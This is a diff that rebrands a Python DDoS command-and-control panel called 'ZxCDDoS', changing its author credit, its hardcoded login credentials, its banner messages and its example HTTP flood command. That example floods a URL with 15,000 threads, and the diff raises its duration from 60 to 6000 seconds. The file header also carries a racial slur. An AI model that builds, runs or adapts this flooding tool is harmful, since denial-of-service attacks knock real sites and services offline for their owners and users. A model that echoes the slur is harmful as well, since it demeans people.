@@ -1,5 +1,5 @@
 ##############################
-# ZxCDDoS Made by zxcr9999   #
+# ZxCDDoS Made by ihsan   #
 # COPY = NIGGER              #
 ##############################
 
@@ -594,7 +594,7 @@ def main():
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('Example: httpflood http://example.com 15000 get 6000')
 
         elif "httpget" in cnc:
             try:
@@ -754,16 +754,16 @@ CLEAR   ► CLEAR TERMINAL
 
 def login():
     clear()
-    user = "admin"
-    passwd = "admin"
+    user = "legend"
+    passwd = "hax"
     username = input("⚡ Username: ")
     password = getpass.getpass(prompt='⚡ Password: ')
     if username != user or password != passwd:
         print("")
-        print("⚡ Haizzz, you're so cute...")
+        print("⚡ wrong pass")
         sys.exit(1)
     elif username == user and password == passwd:
-        print("⚡ Welcome to ZxC C2!")
+        print("⚡ DDoS Attack By Ihsan")
         time.sleep(0.3)
         ascii_vro()
         main()
